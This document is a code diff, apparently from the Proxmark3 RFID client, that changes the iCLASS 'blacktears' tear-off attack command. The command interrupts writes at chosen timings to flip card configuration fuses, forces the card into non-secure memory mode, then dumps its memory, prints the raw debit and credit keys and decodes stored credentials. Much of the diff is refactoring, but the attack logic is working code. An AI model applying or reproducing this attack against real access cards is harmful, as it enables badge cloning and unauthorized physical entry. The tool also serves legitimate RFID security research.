@@ -1923,6 +1923,115 @@ static bool select_only(uint8_t *CSN, uint8_t *CCNR, bool verbose, bool shallow_
     return true;
 }
 
+// iclass_dump_non_secure - read all blocks from a non-secure page mode iCLASS tag.
+// Returns PM3_SUCCESS on success. On success, *tag_data is filled with the
+// full tag memory (0x100 * 8 bytes) and *taglen is set to the number of
+// valid bytes (= (app_limit1 + 1) * 8).
+// Caller must pass a zeroed/initialised buffer of at least 0x100 * 8 bytes.
+static int iclass_dump_non_secure(bool shallow_mod, uint8_t *tag_data, uint16_t *taglen) {
+
+    iclass_card_select_t payload_rdr = {
+        .flags = (FLAG_ICLASS_READER_INIT | FLAG_ICLASS_READER_CLEARTRACE)
+    };
+
+    if (shallow_mod) {
+        payload_rdr.flags |= FLAG_ICLASS_READER_SHALLOW_MOD;
+    }
+
+    clearCommandBuffer();
+    PacketResponseNG resp;
+    SendCommandNG(CMD_HF_ICLASS_READER, (uint8_t *)&payload_rdr, sizeof(iclass_card_select_t));
+    if (WaitForResponseTimeout(CMD_HF_ICLASS_READER, &resp, 2000) == false) {
+        PrintAndLogEx(WARNING, "command execution time out");
+        DropField();
+        return PM3_ESOFT;
+    }
+    DropField();
+
+    if (resp.status == PM3_ERFTRANS) {
+        PrintAndLogEx(FAILED, "no tag found");
+        return PM3_ESOFT;
+    }
+
+    iclass_card_select_resp_t *r = (iclass_card_select_resp_t *)resp.data.asBytes;
+    if (r->status == FLAG_ICLASS_NULL) {
+        PrintAndLogEx(FAILED, "failed to read block 0,1,2");
+        return PM3_ESOFT;
+    }
+
+    picopass_hdr_t *hdr = &r->header.hdr;
+
+    // copy blocks 0-2 (CSN, config, e-purse) already returned by reader command
+    memcpy(tag_data, hdr, 24);
+
+    uint8_t type = get_mem_config(hdr);
+    uint8_t app_limit1 = card_app2_limit[type];
+
+    PrintAndLogEx(INFO, "Non-secure page mode");
+    PrintAndLogEx(INFO, "Dumping all available memory, block 3 - %u (0x%02x)", app_limit1, app_limit1);
+
+    iclass_dump_req_t payload = {
+        .req.use_raw        = false,
+        .req.use_elite      = false,
+        .req.use_credit_key = false,
+        .req.use_replay     = false,
+        .req.send_reply     = true,
+        .req.do_auth        = false,
+        .req.shallow_mod    = shallow_mod,
+        .start_block        = 3,
+        .end_block          = app_limit1,
+    };
+
+    clearCommandBuffer();
+    SendCommandNG(CMD_HF_ICLASS_DUMP, (uint8_t *)&payload, sizeof(payload));
+
+    while (true) {
+        PrintAndLogEx(NORMAL, "." NOLF);
+        if (kbd_enter_pressed()) {
+            PrintAndLogEx(WARNING, "\naborted via keyboard!\n");
+            DropField();
+            return PM3_EOPABORTED;
+        }
+        if (WaitForResponseTimeout(CMD_HF_ICLASS_DUMP, &resp, 2000)) {
+            break;
+        }
+    }
+    PrintAndLogEx(NORMAL, "");
+
+    if (resp.status != PM3_SUCCESS) {
+        PrintAndLogEx(ERR, "failed to communicate with card");
+        return resp.status;
+    }
+
+    struct p_resp {
+        bool     isOK;
+        uint16_t block_cnt;
+        uint32_t bb_offset;
+    } PACKED;
+    struct p_resp *packet = (struct p_resp *)resp.data.asBytes;
+
+    if (packet->isOK == false) {
+        PrintAndLogEx(WARNING, "read blocks failed");
+        return PM3_ESOFT;
+    }
+
+    uint32_t startindex  = packet->bb_offset;
+    uint32_t blocks_read = packet->block_cnt;
+
+    uint8_t tempbuf[0x100 * PICOPASS_BLOCK_SIZE];
+    if (GetFromDevice(BIG_BUF, tempbuf, sizeof(tempbuf), startindex, NULL, 0, NULL, 2500, false) == false) {
+        PrintAndLogEx(WARNING, "command execution time out");
+        return PM3_ETIMEOUT;
+    }
+
+    memcpy(tag_data + (PICOPASS_BLOCK_SIZE * 3),
+           tempbuf  + (PICOPASS_BLOCK_SIZE * 3),
+           blocks_read * PICOPASS_BLOCK_SIZE);
+
+    *taglen = (app_limit1 + 1) * PICOPASS_BLOCK_SIZE;
+    return PM3_SUCCESS;
+}
+
 static int CmdHFiClassDump(const char *Cmd) {
     CLIParserContext *ctx;
     CLIParserInit(&ctx, "hf iclass dump",
@@ -3584,6 +3693,32 @@ out:
     return isok;
 }
 
+static void iclass_read_interesting_data(uint8_t *key, uint8_t keyType, bool elite, bool rawkey, bool use_replay,
+                                         bool verbose, bool shallow_mod) {
+        bool auth = false;
+        uint8_t blockno = 3;
+        uint8_t kd_read[8] = {0};
+        iclass_read_block_ex(key, blockno, keyType, elite, rawkey, use_replay, verbose, auth, shallow_mod, kd_read, false);
+
+        blockno = 4;
+        uint8_t kc_read[8] = {0};
+        iclass_read_block_ex(key, blockno, keyType, elite, rawkey, use_replay, verbose, auth, shallow_mod, kc_read, false);
+
+        PrintAndLogEx(SUCCESS, "Raw Debit Key.............. " _YELLOW_("%s"), sprint_hex_inrow(kd_read, sizeof(kd_read)));
+        PrintAndLogEx(SUCCESS, "Raw Credit Key............. " _YELLOW_("%s"), sprint_hex_inrow(kc_read, sizeof(kc_read)));
+
+        // read dump data here and print (SIO ,  wiegand)
+        uint16_t n = 0;
+        uint8_t d[0x100 * PICOPASS_BLOCK_SIZE] = {0};
+        iclass_dump_non_secure(shallow_mod, d, &n);
+
+        DropField();
+
+        iclass_decode_credentials(d);
+
+        // We should send it to SAM if we detect one installed,  and  get the FC/CN out
+}
+
 static int CmdHFiClass_BlackTears(const char *Cmd) {
     CLIParserContext *ctx;
     CLIParserInit(&ctx, "hf iclass blacktears",
@@ -3615,14 +3750,16 @@ static int CmdHFiClass_BlackTears(const char *Cmd) {
     int key_nr = arg_get_int_def(ctx, 2, -1);
     int blockno = 1;
 
-    uint8_t data[8] = {0x12,0xFF,0xFE,0xFF,0x7F,0x1F,0xFF,0x2C}; //tearoff payload
+    uint8_t data[8] = {0x12, 0xFF, 0xFE, 0xFF, 0x7F, 0x1F, 0xFF, 0x2C}; // tearoff payload
     uint8_t mac[4] = {0};
 
+    // Start at 1700,  end at 1900.
+    // 5 steps increments
 
     int tearoff_start = arg_get_int_def(ctx, 4, 1700);
     int tearoff_original_start = tearoff_start; // save original start value for later use
     int tearoff_increment = arg_get_int_def(ctx, 5, 5);
-    int tearoff_end = arg_get_int_def(ctx, 6, tearoff_start + 200); //1900 default
+    int tearoff_end = arg_get_int_def(ctx, 6, tearoff_start + 200); // 1900 default
 
     int otp_len = 0;
     uint8_t otp[2] = {0};
@@ -3670,7 +3807,7 @@ static int CmdHFiClass_BlackTears(const char *Cmd) {
         }
     }
 
-    if (otp_len > 0){
+    if (otp_len > 0) {
         if (otp_len != 2) {
             PrintAndLogEx(ERR, "OTP is incorrect length");
             return PM3_EINVARG;
@@ -3683,10 +3820,10 @@ static int CmdHFiClass_BlackTears(const char *Cmd) {
     int isok = PM3_SUCCESS;
     bool read_ok = false;
     uint8_t keyType = ICLASS_DEBIT_KEYTYPE;
-    if(use_credit_key == true){
+    if (use_credit_key == true) {
         PrintAndLogEx(SUCCESS, "Using " _YELLOW_("credit") " key");
         keyType = ICLASS_CREDIT_KEYTYPE;
-    }else{
+    } else {
         PrintAndLogEx(SUCCESS, "Using " _YELLOW_("debit") " key");
     }    
 
@@ -3739,24 +3876,21 @@ static int CmdHFiClass_BlackTears(const char *Cmd) {
     picopass_hdr_t *hdr = &r->header.hdr;
     uint8_t pagemap = get_pagemap(hdr);
     if (pagemap == PICOPASS_NON_SECURE_PAGEMODE) {
-        PrintAndLogEx(INFO, _GREEN_("Card already in non-secure page mode!"));
-        read_auth = false;
-        blockno = 3;
-        uint8_t kd_read[8] = {0};
-        iclass_read_block_ex(key, blockno, keyType, elite, rawkey, use_replay, verbose, read_auth, shallow_mod, kd_read, false);
-        blockno = 4;
-        uint8_t kc_read[8] = {0};
-        iclass_read_block_ex(key, blockno, keyType, elite, rawkey, use_replay, verbose, read_auth, shallow_mod, kc_read, false);
-        PrintAndLogEx(SUCCESS, "Raw Debit Key.............. " _YELLOW_("%s"), sprint_hex_inrow(kd_read, sizeof(kd_read)));;
-        PrintAndLogEx(SUCCESS, "Raw Credit Key............. " _YELLOW_("%s"), sprint_hex_inrow(kc_read, sizeof(kc_read)));;
+        PrintAndLogEx(INFO, "Card already in non-secure page mode");
+        PrintAndLogEx(HINT, "try `" _YELLOW_("hf iclass dump") "` - to extract all memory");
         DropField();
-        return PM3_ESOFT;
+        return PM3_SUCCESS;
     }
 
     if (pagemap == 0x0) {
         PrintAndLogEx(WARNING, _RED_("No auth possible. Read only if RA is enabled"));
         goto out;
     }
+
+    #define TEAR_INITAL         0x3C
+    #define TEAR_PERSO_ENABLED  0xBC
+    #define TEAR_PERSO_STABLE   0xBE
+    #define TEAR_UNLOCKED       0xAC
 
 
     // perform initial read here, repeat if failed or 00s
@@ -3802,13 +3936,12 @@ static int CmdHFiClass_BlackTears(const char *Cmd) {
     // clear trace log
     SendCommandNG(CMD_BUFF_CLEAR, NULL, 0);
 
-    
-
     PrintAndLogEx(INFO, "---------------------------------------");
     PrintAndLogEx(NORMAL, "");
     PrintAndLogEx(INFO, "Press " _GREEN_("<Enter>") " to exit");
     PrintAndLogEx(NORMAL, "");
     PrintAndLogEx(INFO, "--------------- " _CYAN_("start") " -----------------\n");
+
     // Main loop
     while ((tearoff_start <= tearoff_end) && (read_ok == false)) {
 
@@ -3938,7 +4071,7 @@ static int CmdHFiClass_BlackTears(const char *Cmd) {
 
             if (data_read[7] != data_read_orig[7]) {
                 PrintAndLogEx(NORMAL, "");
-                PrintAndLogEx(SUCCESS, "Fuse changed, from "_YELLOW_("%02x")" to "_YELLOW_("%02x"), data_read_orig[7], data_read[7]);
+                PrintAndLogEx(SUCCESS, "Fuse changed, from "_YELLOW_("0x%02X")" to "_YELLOW_("0x%02X"), data_read_orig[7], data_read[7]);
 
                 const char *flag_names[8] = {
                     "RA",
@@ -3955,7 +4088,13 @@ static int CmdHFiClass_BlackTears(const char *Cmd) {
                 for (int i = 7; i >= 0; --i) {
                     int bit1 = (data_read_orig[7] >> i) & 1;
                     int bit2 = (data_read[7] >> i) & 1;
-                    PrintAndLogEx(INFO, "%-11s %-10d %-10d", flag_names[i], bit1, bit2);
+
+                    // if bit flipped,  mark it with color
+                    if (bit1 != bit2) {
+                        PrintAndLogEx(SUCCESS, "%-11s %-10d " _GREEN_("%-10d"), flag_names[i], bit1, bit2);
+                    } else {
+                        PrintAndLogEx(INFO, "%-11s %-10d %-10d", flag_names[i], bit1, bit2);
+                    }
                 }
 
                 isok = PM3_SUCCESS;
@@ -3963,14 +4102,14 @@ static int CmdHFiClass_BlackTears(const char *Cmd) {
             }
 
             // if more OTP bits set..
-            if (data_read[1] > data_read_orig[1] ||
-                    data_read[2] > data_read_orig[2]) {
+            if (data_read[1] > data_read_orig[1] || data_read[2] > data_read_orig[2]) {
+
                 PrintAndLogEx(SUCCESS, "More OTP bits got set!!!");
 
                 data_read[7] = 0xBC;
                 res = iclass_write_block(blockno, data_read, mac, key, use_credit_key, elite, rawkey, use_replay, verbose, auth, shallow_mod);
                 if (res != PM3_SUCCESS) {
-                    PrintAndLogEx(INFO, "Stabilize the bits ( "_RED_("failed") " )");
+                    PrintAndLogEx(INFO, "Stabilize the bits ( %s )", _RED_("fail"));
                 }
 
                 isok = PM3_SUCCESS;
@@ -4023,6 +4162,7 @@ out:
         .off = true
     };
     handle_tearoff(&params, false);
+
     PrintAndLogEx(NORMAL, "");
     PrintAndLogEx(INFO, "Done!");
     PrintAndLogEx(NORMAL, "");
@@ -4030,45 +4170,71 @@ out:
 
     read_auth = false; 
     uint8_t data_read[8]= {0};   
-    uint8_t data_read2[8] = {0}; 
+    uint8_t data_verify[8] = {0}; 
+    
     int res = iclass_read_block_ex(key, blockno, keyType, elite, rawkey, use_replay, verbose, read_auth, shallow_mod, data_read, false);
-    if (res == PM3_SUCCESS){
-        if(data_read[7] == 0xBC){ //stabilize with write operation to 0xBE
-            PrintAndLogEx(SUCCESS, "Detected Fuse: "_GREEN_("%02x")" Stabilizing to: "_YELLOW_("0xBE"), data_read[7]);
+    if (res != PM3_SUCCESS) {
+        return res;
+    }
+
+    uint8_t b7 = data_read[7];
+
+    switch(b7) {
+
+        case TEAR_PERSO_ENABLED: { // stabilize 0xBC with write operation to 0xBE
+            PrintAndLogEx(SUCCESS, "Detected fuse: "_GREEN_("0x%02X") " stabilizing to: "_YELLOW_("0xBE") NOLF, data_read[7]);
+
             memcpy(data, data_read, PICOPASS_BLOCK_SIZE);
-            data[7] = 0xBE;
+            data[7] = TEAR_PERSO_STABLE;
+
             iclass_write_block(blockno, data, mac, key, use_credit_key, elite, rawkey, use_replay, false, auth, shallow_mod);
-            res = iclass_read_block_ex(key, blockno, keyType, elite, rawkey, use_replay, verbose, read_auth, shallow_mod, data_read2, false);
-            if(data_read2[7] == 0xBE){
-                PrintAndLogEx(SUCCESS, "Detected Fuse: "_GREEN_("%02x")" Updating for unlock to: "_YELLOW_("0xAC"), data_read[7]);
-                memcpy(data, data_read2, PICOPASS_BLOCK_SIZE);
-                data[7] = 0xAC;
+            res = iclass_read_block_ex(key, blockno, keyType, elite, rawkey, use_replay, verbose, read_auth, shallow_mod, data_verify, false);
+            
+            if (data_verify[7] == TEAR_PERSO_STABLE) {
+
+                PrintAndLogEx(SUCCESS, " ( %s )", _GREEN_("ok"));
+                PrintAndLogEx(SUCCESS, "Detected fuse: "_GREEN_("0x%02X") " set non-secure memory: "_YELLOW_("0xAC"), data_read[7]);
+                
+                memcpy(data, data_verify, PICOPASS_BLOCK_SIZE);
+                data[7] = TEAR_UNLOCKED;
+            
                 iclass_write_block(blockno, data, mac, key, use_credit_key, elite, rawkey, use_replay, false, auth, shallow_mod);
-            }      
-        }else if(data_read[7] == 0xBE){ //unlock with write operation to 0xAC
-            PrintAndLogEx(SUCCESS, "Detected Fuse: "_GREEN_("%02x")" Updating for unlock to: "_YELLOW_("0xAC"), data_read[7]);
+            } else {
+                PrintAndLogEx(FAILED, " ( %s )", _RED_("fail"));
+            }
+            break;
+
+        }
+        case TEAR_PERSO_STABLE: { // unlock tag with write operation to 0xAC
+            PrintAndLogEx(SUCCESS, "Detected fuse: "_GREEN_("0x%02X") " set non-secure memory: "_YELLOW_("0xAC"), data_read[7]);
+
             memcpy(data, data_read, PICOPASS_BLOCK_SIZE);
-            data[7] = 0xAC;
+            data[7] = TEAR_UNLOCKED;
+
             iclass_write_block(blockno, data, mac, key, use_credit_key, elite, rawkey, use_replay, false, auth, shallow_mod);
-        }else if(data_read[7] == 0xAC){//don't do anything as this is ok
-            PrintAndLogEx(SUCCESS, "Detected Fuse: "_GREEN_("%02x")"! All is good!", data_read[7]);
-        }else if (data_read[7] == 0x3C){
-            PrintAndLogEx(INFO, _YELLOW_("Fuses unchanged. Try again if the OTP is unchanged."));  
-        }else{
-            PrintAndLogEx(INFO, _YELLOW_("Did not detect 0xBC or 0xBE fuse, might need manual intervention!"));
-        }        
+            
+            break;
+        }
+        case TEAR_UNLOCKED: { // don't do anything as this is ok
+            PrintAndLogEx(SUCCESS, "Detected fuse: "_GREEN_("0x%02X")" _non secure memory_ ( %s )", data_read[7], _GREEN_("ok"));
+
+            // if tag is now UNLOCKED,  read block 3 and 4 and print the content
+            iclass_read_interesting_data(key, keyType, elite, rawkey, use_replay, verbose, shallow_mod);
+
+            break;
+        } 
+        case TEAR_INITAL: {
+            PrintAndLogEx(INFO, _YELLOW_("Fuses unchanged. Try again if the OTP is unchanged"));
+            // check for OTP change?
+            break;
+        }
+        default: {
+            PrintAndLogEx(INFO, _YELLOW_("Did not detect " _YELLOW_("0xBC") " or " _YELLOW_("0xBE") " fuse, might need manual intervention!"));
+            break;
+        }
     }
-    iclass_read_block_ex(key, blockno, keyType, elite, rawkey, use_replay, verbose, read_auth, shallow_mod, data_read2, false);
-    if(data_read[7] == 0xAC || data_read2[7] == 0xAC){ //read block 3 and 4 and print the content
-        blockno = 3;
-        uint8_t kd_read[8] = {0};
-        res = iclass_read_block_ex(key, blockno, keyType, elite, rawkey, use_replay, verbose, read_auth, shallow_mod, kd_read, false);
-        blockno = 4;
-        uint8_t kc_read[8] = {0};
-        res = iclass_read_block_ex(key, blockno, keyType, elite, rawkey, use_replay, verbose, read_auth, shallow_mod, kc_read, false);
-        PrintAndLogEx(SUCCESS, "Raw Debit Key.............. " _YELLOW_("%s"), sprint_hex_inrow(kd_read, sizeof(kd_read)));;
-        PrintAndLogEx(SUCCESS, "Raw Credit Key............. " _YELLOW_("%s"), sprint_hex_inrow(kc_read, sizeof(kc_read)));;
-    }
+    
+
     return isok;
 }
 
